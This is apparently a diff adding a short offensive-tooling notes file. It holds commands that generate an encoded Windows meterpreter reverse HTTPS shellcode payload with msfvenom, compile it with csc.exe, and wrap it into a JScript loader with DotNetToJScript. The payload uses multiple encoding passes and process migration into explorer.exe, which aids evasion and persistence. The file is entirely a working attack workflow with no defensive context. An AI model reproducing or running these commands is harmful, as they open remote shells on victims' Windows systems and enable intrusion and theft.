@@ -1,0 +1,12 @@
+msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443  exitfunc=thread -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' prependmigrate=true prependmigrateprocess=explorer.exe -f csharp
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -unsafe -platform:x86 -target:library code.cs
+
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -unsafe -platform:x86 -target:winexe code.cs
+
+
+DotNetToJScript.exe -c Compute.Program -o C:\Tools\shellcode.js C:\Tools\code.dll
+
+
+DotNetToJScript.exe -v4 -c Compute.Program -o C:\Tools\shellcode.js C:\Tools\code.dll
